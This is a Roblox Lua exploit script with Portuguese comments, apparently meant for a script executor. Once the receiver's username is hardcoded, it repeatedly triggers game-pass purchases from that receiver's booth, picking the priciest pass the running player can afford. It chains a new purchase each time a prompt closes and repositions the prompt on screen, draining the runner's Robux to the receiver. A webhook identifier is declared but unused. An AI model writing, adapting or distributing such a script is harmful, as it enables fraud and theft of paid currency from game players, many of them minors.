local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local request = syn and syn.request or request
if typeof(request) ~= "function" then
    error("Request function not found!")
end

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Coloque aqui o username do jogador que você quer enviar Robux
local Username = "Ian_wp27"

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success or not UserId then
    warn("Usuário não encontrado!")
    return
end

local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Players.LocalPlayer:Kick("Receiver not found!")
    return
end

local asset
local userRobux

-- Função de compra: escolhe o **maior preço que você consegue pagar**
local function Purchase()
    local bestPrice = 0
    asset = nil

    userRobux = tonumber(userRobux) or 0

    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        local assetType = v:GetAttribute("AssetType")
        local owns = MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId"))
        local price = tonumber(v:GetAttribute("AssetPrice"))

        if assetType == "Gamepass" and not owns and price and price <= userRobux then
            if price > bestPrice then
                asset = v
                bestPrice = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, bestPrice)
    end
end

-- Espera o PurchasePromptApp aparecer (funciona para mobile e PC)
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

-- Ajusta o botão para mobile (esquerda)
local function FixMobilePrompt()
    local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            -- centraliza ou move para a esquerda no mobile
            if game:GetService("UserInputService").TouchEnabled then
                child.Position = UDim2.new(0, 50, 0.5, -child.Size.Y.Offset/2)
            else
                child.Position = UDim2.new(0.5, -child.Size.X.Offset/2, 0.5, -child.Size.Y.Offset/2)
            end
        end
    end)
end

FixMobilePrompt()

-- Lógica de monitoramento para saldo e compras automáticas
local function MonitorPurchases()
    local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            Purchase()
        end
    end)
end

MonitorPurchases()

-- Pega o item inicial
userRobux =  tonumber(Remotes.Function("GetUserRobux"):InvokeServer()) or 0
Purchase()
